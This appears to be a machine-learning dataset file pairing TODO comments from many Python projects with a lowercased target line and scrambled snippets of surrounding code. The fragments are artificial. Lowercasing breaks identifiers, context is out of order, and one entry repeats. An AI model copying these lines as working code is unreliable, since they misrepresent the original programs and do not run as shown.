# todo: remove need for this </s> return message	get_commit_message_from_tip message += revision.message + "\n"
# todo: compute the weighted average instead of using the first solid </s> return vector(self.solids()[0].wrapped.centerofmass)	Shape return Vector(self.wrapped.CenterOfMass) else: elif isinstance(self.wrapped, FreeCADPart.Solid): return Vector(self.wrapped.CenterOfMass)
# todo problem - if there are no valid indices, we cannot return anything </s> num_valid_indices = tf.shape(input=indices)[0]	_graph_fn_get_records mask=mask ) probabilities = tf.ones(shape=[num_valid_indices, num_valid_indices]) samples = tf.multinomial(logits=probabilities, num_samples=num_valid_indices)
# todo candidate for move to system/osi as not btrfs related </s> disk = ('/dev/%s' % disk)	wipe_disk def wipe_disk(disk): return run_command([WIPEFS, '-a', disk])
# todo: remnants from rllab -> gym conversion </s> self.set_state(qpos, qvel)	reset_model qvel[self.PUCK_INDS] = 0 qvel[self.TARGET_INDS] = 0 return self._get_obs()
#todo: this isn't actually most_recently_used (as defined in histories) </s> if( ( trans.user == none )	display hda_dict = {} try: and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history
# todo: distributed search messages need to implemented </s> self.logmessage("%s %s" %(msg.__class__, vars(msg)), 4)	ChildDepth def ChildDepth(self, msg):
# todo: figure out how to get multiscanner to report </s> original_filename = file_.filename	create_task to UPLOAD_FOLDER. Return task id and 201 status. file_ = request.files['file'] f_name = hashlib.sha256(file_.read()).hexdigest() file_.seek(0)
# todo use deepcopy() here </s> return polygonsonimage(polygons, shape)	on else: polygons = [poly.project(self.shape, shape) for poly in self.polygons]
# todo: remove all elements of the list and remove the blacklist </s> blacklist = [	test_no_tf_cond def test_no_tf_cond(): "tensorflow_addons/text/crf.py", "tensorflow_addons/layers/wrappers.py",
# todo the following line should use lazy lookup name-to-index mapping </s> rec.lookuplistindex = item[1]	parseLookupRecords assert item[0] > 0, item[0] rec.SequenceIndex = item[0] - 1 lst.append(rec) return lst
# now we can kill it. todo: on a slow machine, the node might kill </s> def _stop(res):	test_client d.addCallback(_started) d.addCallback(lambda res: self.poll(_node_has_started)) open(HOTLINE_FILE, "w").write("") self.failUnless(os.path.exists(TWISTD_PID_FILE))
# todo refactor set position cursor after operation into reusable api. </s> line = self.view.line(self.view.sel()[0].b)	ExSubstitute self.view.sel().add(line.begin()) self.view.replace(edit, target_region, new_region_text) if line.size() > 0: pt = self.view.find('^\\s*', line.begin()).end()
# todo: then observer.events[0] == trial </s> pass	test_hyperparams_json_repository_should_be_observable_with_file_system_changes def test_hyperparams_json_repository_should_be_observable_with_file_system_changes(): repo: HyperparamsJSONRepository = HyperparamsJSONRepository()
# todo: cancel the previous calllater? </s> reactor.calllater(3 * 60, self._time_things_out_maybe)	update_request_time def update_request_time(res): self.last_request = time.time() return res
# todo test that labels in individual blocks are indeed different </s> assert max_id > 1, f"expect more than one segment in watershed result"	test_parallel_watershed_3d assert max_id == max_expected, f"Expect {max_expected} but got {max_id}"
# todo: use lt and rt in profile as well </s> side = left if self.id else rigth	ControllerTrigger ACTION_CONTEXT = Action.AC_TRIGGER def update(self): if self.id in TRIGGERS and side in self.app.current.triggers: self.label.set_label(self.app.current.triggers[side].describe(self.ACTION_CONTEXT))
# todo: end remove hosts/when block </s> for _, kwarg_configs in operation_kwargs.items():	pop_global_op_kwargs 'when': get_kwarg('when', True), } for key, config in kwarg_configs.items(): handler = None
# todo: headervalueerror does not belong here </s> except (headervalueerror, invalidexcelfileexception) as e:	process_bulk_app_translation_upload try: workbook = WorkbookJSONReader(f) msgs.append( (messages.error, _(
# todo use a proper category instead </s> "search": "python_en",	_wordpress_get_pages "status": "publish", "number": number, "offset": offset}, headers=_wordpress_headers())
# todo: uncomment when adding support for literal hex bytes </s> print(bytearray(b'hello world   ').islower())	test_islower print(bytearray(b'hello world').islower())
# todo add test </s> if prevent_zero_size:	extract_from_image x1 = np.clip(x1, 0, image.shape[1]-1) x2 = np.clip(x2, 0, image.shape[1]-1) if abs(x2 - x1) < 1: x2 = x1 + 1
self.assertequal(r[1], 0)  # todo: that is success? </s> key = token.token.get_otpkey().getkey()	test_05_success r = token.authenticate("{}234567".format(self.otppin)) self.assertEqual(r[0], True) self.assertEqual(key, "X"*24 + "Z"*224) token.delete_token()
# todo: add hook to be called after each song </s> except exception:	MusicBot entries_added = await player.playlist.async_process_sc_bc_playlist( playlist_url, channel=channel, author=author) traceback.print_exc() raise exceptions.CommandError('Error handling playlist %s queuing.' % playlist_url, expire_in=30)
# todo: verify </s> mass = elem.mass()	build_Mgg Mbb[j1, j1] = Mbb[j1+1, j1+1] = mass / 2 elif etype == 'CTRIA3': nid1, nid2, nid3 = elem.nodes i1 = dof_map[(nid1, 1)]
# @todo: bulk lookup </s> latlon = current.db(ktable.id == r_id).select(ktable[lat],	add_references LAT = self.Lat LON = self.Lon ktable[LON], limitby=(0, 1)
# todo generator </s> cbysubds = _recursive_install_subds_underneath(	__call__ if subds.path != content_path else "")) subds, recursion_limit,
# todo: cache this result so multiple failing calls don't keep hitting the db </s> return none	sql_product self._sql_product = SQLProduct.objects.get(domain=self.domain, product_id=self.entry_id) except ObjectDoesNotExist: return self._sql_product
# todo: add ssl verification </s> configuration = client.configuration()	get_api_object def get_api_object(cluster_name, cluster_endpoint, challenge, evalai): aws_eks_api = evalai.get_aws_eks_bearer_token(challenge.get("id")) configuration.host = cluster_endpoint
# todo: is that right? </s> pass	unindex_documents es.delete(index, doc_type=Document._meta.db_table, id=doc_id) except pyes.exceptions.NotFoundException:
# todo placeholder; implement </s> pass	init_app backend_options: torch_rpc.RpcBackendOptions, ):
raise notimplementederror  # todo </s> else:	execute_replicated return unshard_array(mesh_spec, mesh_map, out_axis_map, out_shards)
## todo : log error </s> error_code = delete_submissiondetails_doctype(doctype=doctype, action=action)	_delete_submission_from_doctype user_msg.append("""When deleting Submission "%s" from Document Type "%s", it wasn't possible to delete all Functions""" \ % (action, doctype)) if error_code == 0: user_msg.append("""The "%s" Submission has been deleted from the "%s" Document Type""" % (action, doctype))
# todo: verify </s> manager.unregistered(self.consumer_id)	test_unregistered manager = factory.consumer_agent_manager()
# todo: move this code into renderengine. </s> section_start_index = end_index	_handle_tag_type func = engine._make_get_literal(tag_key) elif tag_type == '#': parsed_section, section_end_index, end_index = self._parse_section(template, end_index, tag_key) func = engine._make_get_section(tag_key, parsed_section, self._delimiters,
# todo: this would be a good candidate for refactoring into a testcase subclass shared across backends </s> expected_pks = [str(i) for i in [3, 2, 4, 5, 6, 7, 8, 9, 10, 11]]	test_values_slicing reset_search_queries() self.assertEqual(len(connections['elasticsearch'].queries), 0) results = self.sqs.all().order_by('pub_date').values('pk') self.assertListEqual([i['pk'] for i in results[1:11]], expected_pks)
# todo(jakevdp): in rare cases, this fails python_should_be_executing check. why? </s> self._checkagainstnumpy(f_dense, jit(f_sparse), args_maker)	test_bcoo_dot_general_contract_only self._CheckAgainstNumpy(f_dense, f_sparse, args_maker)
# todo: use xml config to get mac address and then parse ips </s> extra = {'uuid': domain.uuidstring(), 'os_type': domain.ostype(),	_to_node state, max_mem, memory, vcpu_count, used_cpu_time = domain.info() state = self.NODE_STATE_MAP.get(state, NodeState.UNKNOWN) 'types': self.connection.getType(), 'used_memory': memory / 1024, 'vcpu_count': vcpu_count,
# todo: refactor </s> if mode is none:	DenseDesignMatrix def iterator(self, mode=None, batch_size=None, num_batches=None, topo=None, targets=None, rng=None): if hasattr(self, '_iter_subset_class'): mode = self._iter_subset_class
#todo - negative indices, see bug 2411 </s> for i in indices :	compare_sequences else : indices = [0,1,2,int(l/2),l-2,l-1] expected = s[i] assert expected == old[i]
# todo: 'annex.backends' actually is a space separated list. </s> self.config.set('annex.backends', backend, where='local')	AnnexRepo if backend: lgr.debug("Setting annex backend to %s", backend) self._batched = BatchedAnnexes(batch_size=batch_size) @classmethod
# todo: we should probably have a special folder just for header </s> import brian2.synapses as synapses	create_extension import numpy c_include_dirs.append(numpy.get_include()) synapses_dir = os.path.dirname(synapses.__file__) c_include_dirs.append(synapses_dir)
# todo: attributes </s> assert attributes is none, "internal error" # see above	_create_equiv if old_target != target.id: Messager.warning('_create_equiv: equiv reselect not supported yet, please tell the devs if you need this feature (mention "issue #797").')
# todo: remove compatability hook </s> if not exists(pathjoin(vdir,esky_control_dir,"bootstrap")):	is_installed_version_dir Currently, a completed installation is indicated by the lack of an "esky-files/bootstrap" directory. if not exists(pathjoin(vdir,"esky-bootstrap")): return True
# todo: cast the value? </s> yield entry	altentries def altentries(self, tag=TAGS.ALTVAL): for entry in self.get_tag_entries(tag=tag):
# todo pseudo code: </s> pass	OpenUri @dbus.service.method(dbus_interface=player_interface) def OpenUri(self, uri):
# todo: displacement. </s> else:	filter_apply if isinstance(currentNode, bpy.types.ShaderNodeTexImage) and currentNode.image is not None and currentNode not in filtered_textures: filtered_textures.append(currentNode) if export_settings['gltf_common'] != '-': for currentTextureSlot in currentMaterial.texture_slots:
# todo: conflict detection/resolution </s> for key in d:	_collect_analysis if not d: continue analysis.setdefault(key, {}).update(d[key]) return analysis
# todo make "master" not hard-coded, fetch it from some metadata </s> branch = default_branch	_resolveNamedCommit def _resolveNamedCommit(self, commit, volume): commits = self.commitDatabase.read(volume, branch) return commits[-1]["id"]
# todo(piyush): current api-site doesn't contain this api description. </s> uri = '/agents/%s/l3-routers' % agent_id	add_router_to_l3_agent def add_router_to_l3_agent(self, agent_id, **kwargs): return self.create_resource(uri, kwargs)
federated_only=federated_only  # todo: 289 </s> )	from_bytes dht_host=dht_info.host, dht_port=dht_info.port, return stranger_ursula_from_public_keys
# todo: stop at minimum scale </s> self.scalechanged.emit(self.current_scale_)	setScaleRelative self.current_scale_ *= factor
# todo: and results </s> return asynclist(tasks)	Mount tasks = [mounter.add(path, recursive=recursive) for path in options['<device>']] else: return mounter.add_all(recursive=recursive)
# todo(b/179510447): align these parameters with schulman 17. </s> return tf.keras.layers.dense(	means_layers def means_layers(): action_tensor_spec.shape.num_elements(), kernel_initializer=tf.keras.initializers.VarianceScaling(
# todo: make this pretty </s> return httpresponse('error creating pipeline: is the storage server running? please contact administrator.')	storagesetup storage_service.create_pipeline() except: space = storage_service.get_space(access_protocol="FS", path=default_space) if len(space) < 1:
# todo: another solution should be used here. this is a hack for compatibility reasons. to resolve the gadget address calculation of segments of elf files have a different base address if calculated segment.virtualaddress - segment.offset </s> offset = section.offset - (binary.imagebase - (section.virtualaddress - section.offset))	_searchGadgetsSingle toReturn = [] code = bytes(bytearray(section.bytes)) arch = binary.arch max_progress = len(code) * len(arch.endings[gtype])
# todo: repeating timers </s> min_timeout = 0.001	_CalcTimeout return None timeout = None for timer in self._timer.itervalues(): time_left = (timer.start + timer.interval) - now
# todo: in 0.6.0 change this to "disabled": false </s> "enabled": true,	test_server_mode "duplicate_cn": True, "engine": "rsax", "fast_io": True, "fragment": 0,
# xxx - 'todo' should just be a string </s> self.expectedfailures.append((test, error, todo))	TestResult @type error: L{failure.Failure} @type todo: L{unittest.Todo} def addSuccess(self, test): @type test: L{pyunit.TestCase}
# todo: support delete by name </s> actionexec = actionexecution.get_by_id(id)	delete POST /actionexecutions/1?_method=delete DELETE /actionexecutions/1 ActionExecution.delete(actionexec)
#todo(#212): use a map construct instead of unrolling. </s> operand = batching.move_dim_to_front(operand, o_bdims)	select_and_scatter_add_batch_rule return outputs, 0 elif o_bdims is not None: outputs = [ _select_and_scatter_add(source, o, **kwargs) for o in operand]
#todo: check cost line </s> coast_tile_found = false	isGroundBuildRequirementSatisfied @classmethod def isGroundBuildRequirementSatisfied(cls, x, y, island, **state): for xx,yy in [ (xx,yy) for xx in xrange(x, x + cls.size[0]) for yy in xrange(y, y + cls.size[1]) ]: tile = island.get_tile(Point(xx,yy))
# todo: remove when migration plan / state is passed (#24100). </s> if not is_latest_migration_applied('contenttypes'):	update_contenttypes Creates content types for models in the given app, removing any model entries that no longer have a matching model class. return if not app_config.models_module:
# todo: what is this here for? we should really be catching something </s> return []	get_viewable_reports return models except AttributeError:
# todo add sp_playlist_* methods </s> return name if name else none	name name = utils.to_unicode(lib.sp_playlist_name(self._sp_playlist))
# todo(slaweq): change this to neutron floating ips and turn neutron </s> mock_nova.floating_ips.list.return_value = [fake_floating_ip]	test_create_server_wait_server_error mock_nova.servers.get.return_value = build_server mock_nova.servers.list.side_effect = [[build_server], [error_server]] self.assertRaises( exc.OpenStackCloudException,
# todo: update hits@k </s> hits_at_k = none	compute_mean_rank_and_hits_at_k ranks = ranks_subject_based + ranks_object_based mean_rank = np.mean(ranks) stop = timeit.default_timer() log.info("Evaluation took %s seconds \n" % (str(round(stop - start))))
# todo: distributed search messages need to implemented </s> self.logmessage("%s %s" %(msg.__class__, vars(msg)), 4)	ChildDepth def ChildDepth(self, msg):
# todo: check proactive neighbor resolution </s> self.asserttrue(self.packet_outs_from_flows(echo_replies))	test_icmp_ping_unknown_neighbor 'ipv4_dst': '10.0.0.99', 'echo_request_data': bytes('A'*8, encoding='UTF-8')})
# todo: this should be written to a log </s> print('pickled dag {dag} as pickle_id:{pickle_id}'	_run session.commit() pickle_id = pickle.id .format(**locals())) except Exception as e:
# todo: sysex messages do not arrive here. </s> def pending(self):	pending if self._parser.pending(): return self._parser.get_message()
# todo pydocs </s> e = s	_escape def _escape(s): e = e.replace('\\', '\\\\') e = e.replace('\n', '\\n')
entry['meta']['type'] = 'padding'  # todo handle padding, summarize and transfer </s> entry['flag']       = posting.flag	_journal_for_postings if isinstance(posting, Transaction): if posting.flag == 'P': entry['payee']      = posting.payee entry['narration']  = posting.narration
# todo: test. </s> return [status.newfromjsondict(x) for x in data]	GetListTimeline data = self._ParseAndCheckTwitter(resp.content.decode('utf-8'))
# todo: remove patch and update test once calculation_magic is implemented </s> @mock.patch("sentry.tasks.low_priority_symbolication.calculation_magic", lambda x, y: true)	UpdateLpqEligibility assert store.get_lpq_projects() == {17} @freeze_time(datetime.fromtimestamp(0)) def test_no_counts_some_durations(self, store) -> None: store.increment_project_duration_counter(17, 0, 10)
# todo be more fussy with prefix checking: validate strings </s> langs = [lang for lang in langs if any(	get_user_locale os.path.join(localization_dir, "*", "LC_MESSAGES", "cms.mo"))] if self.contest.allowed_localizations: lang.startswith(prefix) for prefix in self.contest.allowed_localizations)]
# todo: division of mimo transfer function objects is quite difficult. </s> def __div__(self, other):	xTransferFunction def __rmul__(self, other): return self * other if self.inputs > 1 or self.outputs > 1 or \ other.inputs > 1 or other.outputs > 1:
# todo(b/141131288): enable test once complex sort is supported on tpu. </s> if (jnp.issubdtype(dtype, jnp.complexfloating)	testLexsort for axis in (-1, *range(len(shape) - 1)))) def testLexsort(self, dtype, shape, input_type, axis): and jtu.device_under_test() == "tpu"): self.skipTest("complex sort not supported on TPU")
# todo: support ipv6 addresses as well. </s> await loop.create_datagram_endpoint(	DiscoveryService async def _start_udp_listener(self) -> None: loop = asyncio.get_event_loop() lambda: self.proto, local_addr=('0.0.0.0', self.port),
# todo: optimizer state gets cast to fp16 and back to fp32 for </s> weight, bias, input = make_half_precision_params()	test_state_dict_mixed_precision @pytest.mark.xfail def test_state_dict_mixed_precision(): optimizer = Adam([weight, bias], lr=1e-3, precision=Precision.MIXED_PRECISION) state_dict_test(optimizer, weight, bias, input)
# todo: this ought to be a separate test of block-resources </s> def callback((response, data)):	callback self.assertEqual(response.code, http.OK)
if not config.testnet:  # todo </s> return	compose def compose (db, source, gasprice, startgas, endowment, code_hex): data = struct.pack(config.TXTYPE_FORMAT, ID) data += struct.pack(FORMAT, gasprice, startgas, endowment)
return  # todo: update </s> elif item == 'user_payment_id':	get_user_info return user.address  # TODO: update elif item == 'user_paid': return  # TODO: update elif item == 'user_payment_amount':
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	arp_for_controller 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'})
# todo stub </s> def test_accumulate() -> none:	test_accumulate pass
# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo: argument constraints </s> if len(args) != 0:	search_anns_for_event trigger_text != "*" and trigger_text not in t_ann.text): continue Messager.warning('NOTE: ignoring event argument constraints in search (not implemented yet, sorry!)') ann_matches.append((t_ann, e))
# todo check </s> return self.mimetype	format @interfacedoc def format(self):
# todo doc </s> self.is_archived = false	unarchive def unarchive(self): self.save()
# todo: replace usages of strictredis (redis-py 2.x) with redis in dramatiq 2.0. </s> self.client = client or redis.strictredis(**parameters)	__init__ if url: parameters["connection_pool"] = redis.ConnectionPool.from_url(url)
# todo: macos/win? </s> if platform_is_osx():	grab def grab(self, bbox=None): raise WxBackendError("osx not supported")  # TODO import wx
# todo: handle /dev/null (windows equivalent?) for new or deleted files </s> if before.endswith('.ipynb') or after.endswith('ipynb'):	show_diff If we are diffing a notebook, show the diff via nbdiff. Otherwise, call out to `git diff`. nbdiffapp.main_diff(before, after) else:
#todo: manage different in/out styles </s> if len(self.docs['in']['params']) > 0:	_set_params def _set_params(self): self.docs['out']['params'] = list(self.docs['in']['params']) for e in self.element['params']:
# @todo: extend entity_types within the template </s> need_response = t("activity group"),	DocumentLibrary inv_send = T("Sent Shipment"), inv_warehouse = T("Warehouse"), police_station = T("Police Station"), pr_group = T("Team"),
# todo: skip port_acl table if not configured. </s> return table_config	_generate_acl_tables match_types=matches, set_fields=tuple(set_fields))
# @todo: replace with plot from get /api/v2/show/{id} </s> main_db_con = db.dbconnection()	plotDetails @staticmethod def plotDetails(show, season, episode): result = main_db_con.selectOne( b'SELECT description '
# todo: this could be done using single query, but how? </s> series = session.query(series).filter(series.name==parser.name).first()	get_latest_info def get_latest_info(self, feed, parser): session = Session() log.debug('get_latest_info found series') if not series:
# todo: handle incorrect or invalid certificate connection... </s> client = soapclient(wsdl=wsdl, cert=none, cacert=none)	test_issue33 wsdl = "https://wsaahomo.afip.gob.ar/ws/services/LoginCms?wsdl"
# todo: description </s> def _check_iface(iface_params, vlanmap_type, allinterf, enabled, dispname, indexname, offmessage):	_check_iface result_dict = {} if enabled or allinterf:
# todo: add test option fro datasets that support that </s> dataset_test = get_dataset(args, transform_test, "val")	ef_main metadata = torch.load(args.val_file) root = args.valdir print("by default we're extracting all clips at given fps with 50percent overlap") dataset_test.video_clips.compute_clips(
# todo xxx graalvm change </s> self.assertin('certificate verify failed', repr(e))	test_ssl_cert_verify_error msg = 'unable to get local issuer certificate' self.assertIsInstance(e, ssl.SSLCertVerificationError)
# todo: fix later </s> input_names = self.df.index.values.tolist()	make_batch ys = [list(map(int, transcripts[b].split(' '))) for b in range(len(data_indices))] return {'ys': ys, 'input_names': input_names}
pass # todo(denero) implement </s> def test_extra_field(self):	test_extra_field
# todo: some regressors have extra options in their predict method, and they return a tuple of arrays. </s> xs = [cache[i] for i in step.inputs]	predict cache.update(zip(self.inputs, input_data)) for step in self._steps: if hasattr(step, 'predict'): output_data = step.predict(*Xs)
# todo:  google only takes the first 180 characters, so maybe we find a logical </s> seo_summary = ''	get_seo_description def get_seo_description(content): try: if content:
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_ellipse_draw @requires_application() def test_ellipse_draw(): raise SkipTest with TestingCanvas() as c:
# todo: consider whether this is going to cause a crash on amd cards. it's possible it should be commented out. </s> gldisable(gl_texture_2d)	renderSkin glEnableClientState(GL_NORMAL_ARRAY) glEnableClientState(GL_COLOR_ARRAY) glDisableClientState(GL_TEXTURE_COORD_ARRAY) surface = np.empty((height, width, 4), dtype = np.uint8)
# todo: move following logic under util.filenaming </s> if settings['windows_compatibility'] or sys.platform == 'win32':	_make_filename new_filename = make_short_filename(new_dirname, new_filename, config.setting['windows_compatibility'], config.setting['windows_compatibility_drive_root']) new_filename = new_filename.replace('./', '_/').replace('.\\', '_\\') new_filename = new_filename.replace('/.', '/_').replace('\\.', '\\_')
# todo: write me! </s> def to_sql_values(self):	NumericFilterValue def to_sql_filter(self): pass pass
# todo: move this import to toplevel if possible [bruce 071029 comment] </s> res.name = mol_copy_name(res.name)	wrap_or_rename else: from chunk import mol_copy_name return res
# todo: this is a magic fudge factor... </s> size.width += 3	measure text_string = NSAttributedString.alloc().initWithString_attributes_(text, textAttributes) size = text_string.size() return size.width, size.height
# todo: tor might mark these dirs as setgid </s> assert oct(f.mode) == "0700"	test_tor_service_directories f = File("/var/lib/tor/services/{}".format(tor_service['name'])) assert f.is_directory assert f.user == "debian-tor" assert f.group == "debian-tor"
# todo(sdague): enforce license in init file if it's not empty of content </s> license_found = false	hacking_has_license def hacking_has_license(physical_line, filename, lines, line_number): H102 if _project_is_apache() and not line_number > 1 and len(lines) > 10: for idx, line in enumerate(lines):
# todo(boto-2.49.0): remove when we pull in the next version of boto. </s> boto.s3.key.key.should_retry = _patchedshouldretrymethod	MonkeyPatchBoto completed. import gcs_oauth2_boto_plugin orig_get_plugin_method = boto.plugin.get_plugin def _PatchedGetPluginMethod(cls, requested_capability=None):
# todo sync protocol </s> await asyncio.sleep(0.01)	TestWindow win2 = self.open_window() await i3.command(f'[id={win1}] kill; [id={win2}] kill') i3.main_quit() await i3.subscribe([Event.WINDOW])
# todo: find out how to get global usernames </s> def block(mastodon, rest):	block @command
# todo: collect extra data </s> pass	handle_input self._input_buffer = instr elif self._res_state == BODY_DONE: else: if self._conn_mode == CLOSE:
# todo: get rid of prints, left over from refactoring </s> session = session()	forget_series def forget_series(self, name): series = session.query(Series).filter(Series.name == name.lower()).first() if series:
#todo: add metadata support when it is merged from develop </s> 'user': job.get('user', 'root')}	_format_job_instance 'Target-type': job.get('tgt_type', []),
# todo: write custom scope generator for devices (in case none, etc..). </s> if device is not none:	when_input_complete self.check_input_spaces(input_spaces, action_space) if get_backend() == "tf": with tf.device(device): if self.reuse_variable_scope:
# todo map the alias to its target </s> continue	main continue if elem.findall('./alias'): pattern = unicode(elem.findtext('./decimalFormat/pattern')) decimal_formats[elem.attrib.get('type')] = numbers.parse_pattern(pattern)
# todo: figure out a way to actually log this information without </s> try:	fallback_SIGCHLD def fallback_SIGCHLD(self, sig, stack): result = os.waitpid(-1, os.WNOHANG) while result[0]:
# todo: should we do this? </s> scale_x = scale_y = scale_value	_marker else: scale_value = min(scale_x, scale_y) viewbox = node_format(marker_node)[-1] viewbox_width = viewbox[2] - viewbox[0]
# todo: to be removed in v2.8.0 </s> if not use_backend_specific_templates:	Menu def get_template(self): template_name = self._option_vals.template_name or self.template_name engine = self.get_template_engine() if template_name:
# todo: actually implement feature importance visualization for multiclass problems. </s> if isinstance(shap_values, list):	train explainer = shap.TreeExplainer(self.clf) shap_values = explainer.shap_values(X_train) shap_values = np.sum(np.abs(shap_values), axis=0) important_features = self.get_important_features(importance_cutoff, shap_values)
# todo: can we make use of existing property maps for this? </s> if struct_props is none:	impersonator_args _overrides, override_map = add_handler_field(override_map, _overrides, idx, op) elif isinstance(base, values_struct.W_StructPropertyAccessor): struct_props = {} struct_props[base] = (op, handlers[i])
#todo - complete implementation of these apis </s> return faults.fault(faults.portnotfound(e))	get_resource except exception.PortNotFound as e:
# todo: merge with config_check_pre_system_cron </s> return stop_system_importer_file_csv_run	check_config_user_run stop_system_importer_file_csv_run = True
# todo: remove v1compatibility when v1 migration is complete </s> if config.scheduling.options.v1compatibility:	lookupFunction return (None, None, None) else: return (principal.record.fullName.decode("utf-8"), principal.record.guid,
# todo ... </s> data = sorted()	userLongDescription for key in mainKeys: data[key] = data.get(key, "").strip()
# todo setup attrs </s> self._data = directory(data_path)	_create write_array_metadata(path, self._meta)
errordialog(error[0], error[1]) # todo no-parent </s> gtk.main_quit()	__startgramps if argparser.errors: for error in argparser.errors: sys.exit(1) from .logger import RotateHandler, GtkHandler
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_empty def test_fail_empty(self):
# header. todo for aron: fix polib.py </s> def _remove_extra_msgid(self):	_remove_extra_msgid pofilename = self.fpath with open(pofilename, 'r') as pofile:
# todo: make grouper in query </s> grouper = grouper(dimension='time',	get_dataset resolution = query.resolution or get_resolution(observations) geobox = GeoBox.from_geopolygon(geopolygon, resolution) group_by=lambda ds: ds.center_time, units='seconds since 1970-01-01 00:00:00')
# todo: clean up </s> yield _pubsubs	pubsubs )
# todo: log errors to log file </s> pass	run_cli self.parse_kubeconfig() except: user_input = prompt('kube-shell> ', history=self.history,
# todo: add support of tuple (row_offset, col_offset) </s> original_size = rows - offset, cols - offset	ms_image_deaugment else: batch_size, channels, rows, cols = image.size() scaled_image = torch.nn.functional.interpolate(image, size=original_size, mode=mode, align_corners=align_corners) deaugmented_outputs.append(scaled_image)
# todo: there should be an output for warnings and we should test we get one here </s> self.assertequal(	test_long_line def test_long_line(self): self.__parse('Frequency,Name\n1,a,boom'), [{
pass  # todo </s> def delete(self, uri):	delete
#@todo: remove in 0.4.10 </s> if prefix.endswith("s"):	_updatePlugins else: name = filename.replace(".py", "") type = prefix[:-1] else:
# todo is pexpect thread safe, e.g. could we be blocked on this </s> pnum = self.con.expect('notification handle = .*? \r', timeout=.5)	run with self.connection_lock: try: if pnum == 0: after = self.con.after
# todo: if nucleus/symmetryconstraint bug ever fixed: </s> if not dag.node().hasfn(mfn.kdagnode):	toApiObject dag = MDagPath() sel.getDagPath( 0, dag ) raise RuntimeError return dag
# todo: layer normalization </s> multi_head_dropout_layer = keras.layers.dropout(	get_transformer name='%s-MultiHead' % name, ) rate=dropout, name='%s-MultiHead-Dropout' % name,
# todo: for now we are not going to track bikes roaming around </s> if 'bike' in place.attrib:	filter_stations def filter_stations(self, places): for place in places: if place.attrib['bikes'] == "1" and place.attrib['bike'] == "1": continue
# todo(stephenfin): use a helper </s> return orig_finish_revert(_self, _context, _instance, *a, **kw)	fake_finish_revert_migration self.assertIsNone(_instance.new_flavor)
# todo: is there a nicer way to do this? if i add a new grep plugin i won't </s> pinst.grep(request, response)	test_image_with_image_content_type for pinst in self._plugins:
# todo: not all messages have running status </s> if status_byte < 0x80:	_read_message def _read_message(self, status_byte): dbg('+') dbg('    --- {}'.format('running status')) if self._running_status is None:
# todo implement this </s> pass	gen_event_with_policy def gen_event_with_policy(self, state, policy):
# # fixme: # todo: remove me </s> try:	unpack_url to_crawl['port'] = default_proto_map[to_crawl['scheme']] else: port = url_unpack['port'].decode() except:
# todo: more advanced logic in determining valid symbols </s> return [sym for sym in eq if sym.isalnum() and sym.isupper()]	extract_eq_symbols All other characters are discarded in the processing of the equation. The first symbols in the list is the result of the equation.
# todo: remove in v1.0.0 </s> eval_results = model.test_end(outputs)	_evaluate if test_mode: if self.is_overriden('test_end', model=model): warnings.warn('Method `test_end` was deprecated in 0.7.0 and will be removed 1.0.0.' ' Use `test_epoch_end` instead.', DeprecationWarning)
# todo: make mac table updates less expensive. </s> for i, host in enumerate(sorted(port.hosts(vlans=[vlan]))):	update_metrics port_labels = dict(self.base_prom_labels, port=port.number) port_vlan_labels = dict(self.base_prom_labels, vlan=vlan.vid, port=port.number) mac_int = int(host.replace(':', ''), 16) self.metrics.learned_macs.labels(
# todo: implement counters </s> return {}	getCounters def getCounters(self):
# todo: take this out later </s> if self.name in ['setuptools']:	run_egg_info if self.name == 'distribute' and not os.path.isdir(os.path.join(self.source_dir, 'setuptools')): rmtree(os.path.join(self.source_dir, 'distribute.egg-info')) egg_info_cmd = [sys.executable, 'setup.py', 'egg_info'] else:
# todo: config of maps of packages </s> install_type = self.cfg['container']['install_type']	install expect = expect or self.get_default_expect() if options is None: options = {} if install_type == 'apt': cmd = 'apt-get install'
style="toolbutton", # todo: does this cause problems in some macs? </s> state=tk.normal	create_navigation_link button = ttk.Button(toolbar, image=get_workbench().get_image(image_filename), ) ui_utils.create_tooltip(button, tooltip,
# todo test errors </s> assert_array_equal(expect, actual)	test_advanced_indexing_2d_bool actual = z[42, ix1]
# todo(b/160294509): use tf.compat.v1 when we stop supporting tf 1.15. </s> return (force_tf_compat_v1 or int(major) < 2 or not tf2.enabled() or	use_tf_compat_v1 def use_tf_compat_v1(force_tf_compat_v1: bool) -> bool: major, _, _ = tf.version.VERSION.split('.') not ops.executing_eagerly_outside_functions())
# todo: command+c for mac </s> tk.messagebox.showerror("internal error. use ctrl+c to copy",	on_tk_exception sys.last_traceback = tb traceback.print_exception(exc, val, tb) traceback.format_exc())
self.assertfalse(greps(err, "unit zzz.service not for --user mode")) #todo </s> self.assertequal(out.strip(), "unknown")	bad_usermode_other_commands logg.info(" %s =>%s \n%s\n%s", cmd, end, err, out) self.assertEqual(end, 1) cmd = "docker exec {testname} {systemctl} is-enabled zzz.service -vv" out, err, end = output3(cmd.format(**locals()))
#todo: may be this should go in a decorator for use in every command. </s> cmd_list.extend(files)	annex_add for key in kwargs.keys(): cmd_list.extend([" --%s=%s" % (key, kwargs.get(key))]) status = self.cmd_call_wrapper.run(cmd_list, cwd=self.path) if status not in [0, None]:
# todo remove this crap </s> for entity in entities:	Portal if is_formatted: message, entities = formatter.matrix_to_telegram(message["formatted_body"]) if isinstance(entity, InputMessageEntityMentionName): entity.user_id = await client.get_input_entity(entity.user_id.user_id)
#@todo: remove in 0.4.10 </s> def _init_events(self):	_init_events event_map = {'allDownloadsFinished' : "all_downloads_finished" , 'allDownloadsProcessed': "all_downloads_processed",
# todo: optimize this by using send_data(array[from:to]) </s> for i in range((x_end - x_start) // 8):	display_partial for j in range(y_end - y_start): idx = (y_start + j) * width + x_start // 8 self.send_data(self.frame_buffer[idx + i]) self.send_command(self.DATA_START_TRANSMISSION_2)
# todo: add detection for randomly generated macs (random 48-bit number with its eighth bit set to 1 as </s> unfurl.add_to_queue(	run else: pretty_mac = u.upper() data_type='mac-address', key=None, value=pretty_mac, label="MAC address: {}".format(pretty_mac), parent_id=node.node_id, incoming_edge_config=uuid_edge)
